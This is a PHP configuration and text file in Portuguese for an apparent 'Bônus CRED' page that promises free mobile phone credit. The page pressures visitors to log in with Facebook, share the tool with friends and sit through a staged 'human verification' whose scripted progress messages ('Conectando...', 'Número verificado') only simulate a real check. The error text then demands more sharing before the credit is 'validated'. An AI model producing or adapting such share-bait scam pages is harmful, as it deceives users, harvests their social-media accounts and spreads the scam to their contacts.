<?php
include 'admin/jsonp/lib/conexao.php';
$consulta = $conn->query("SELECT * FROM config");
$linha = $consulta->fetchAll(PDO::FETCH_ASSOC);


$text = array(
    'titulo' => 'Bônus CRED',
    'descricao' => 'Recarga GRÁTIS para o seu celular!',
    'titulo_1' => 'Bônus',
    'titulo_2' => 'CRED',
    'ola' => 'Olá',
    'recarga_gratis' => 'Receba R$ 13,00 de recarga GRÁTIS para o',
    'para_cellar' => 'seu celular!',
    'qualquer_lugar' => 'Selecione o sistema operacional',
    'simples_passos' => 'Basta seguir os 3 passos',
    'simples_passos_2' => 'Veja a seguir como efetuar sua recarga',
    'facil_pratico' => 'Simples e prático',
    'facil_pratico_explicacao' => 'Basta seguir os passos descrito ao lado para efetuar sua recarga',
    'passo_1' => 'Acesse sua conta',
    'passo_1_explicacao' => 'Faça o login com sua conta do facebook com apenas 1 clique!',
    'passo_2' => 'Compartilhe nossa ferramenta',
    'passo_2_explicacao' => 'Mostre para seus amigos a nossa ferramenta para que eles também possam ganhar créditos!',
    'passo_3' => 'Informe seu celular',
    'passo_3_explicacao' => 'Basta informar o número do seu celular, operadora e fazer a verificação.',
    'vamos_comecar' => 'Vamos começar?',
    'acesse_conta' => 'Acesse sua conta',
    'login_facebook' => 'Basta clicar em acessar sua conta pelo facebook, vamos apenas ler o seu nome para criar sua conta caso ainda não exista',
    'login_botao' => 'Login com facebook',
    'compartilhar_botao' => 'Compartilhar',
    'compartilhar_botao2' => 'Compartilhe para receber a sua recarga GRÁTIS!',
    'error' => 'Alguma coisa deu errado, tente novamente!',
    'recarregue' => 'Recarga online grátis',
    'captcha' => 'Esse procedimento é para garantir que a recarga será única para cada número de celular. Clique em uma das opções abaixo e siga as instruções até o fim. Seus créditos serão imediatamente creditados após o término dessa verificação.',
    'verificacao' => 'Verificação Humana (Captcha)',
    'erro_2' => 'Você não completou a verificação de segurança, compartilhe para validar a sua recarga!',
    'idioma' => 'Idiomas',
    'idioma_br' => 'Português',
    'idioma_es' => 'Español',
    'idioma_en' => 'English',
    'button_share_url' => 'https://2.bp.blogspot.com/-a7dumoL3E_8/VC5GEc4VOHI/AAAAAAAABI0/KwfZ4Ka6u4w/s1600/WGwHypw.png',



    //Page finish


    'informe_celular' => 'Informe o número do seu celular',
    'informe_operadora' => 'Operadora',
    'informe_valor' => 'Valor',
    'start' => 'Inserir recarga',
    'complete' => 'Complete a autenticação de segurança para concluir a recarga'

);
$config = array(
    'link_compartilhar' => $linha[0]['link'],
    'link_compartilhar2' => $linha[0]['link2'],
    'titulo' => $linha[0]['titulo'],
    'link_compartilhar2' => $linha[0]['desc'],
    'char_ddd' => 2,
    'regex_cell' => '000000000'
    );

$captcha = array(
    'p1' =>'Iniciando sistema',
    'p2' =>'Conectando...',
    'p2c' =>'Conexão realizada com sucesso',
    'p3' =>'Verificando se o número não foi utilizado antes',
    'p3c' =>'Número verificado',
    'p4' =>'Validação da conta...',
    'p4c' =>'Validação concluída...',
    'p5' => 'Verificação de segurança...',
    'p6' => 'Aguardando autenticação humana...',
    );

$operators = array('Vivo', 'Claro', 'Nextel', 'TIM', 'Oi');

$valores = array('R$ 15,00', 'R$ 25,00', 'R$ 40,00');
?>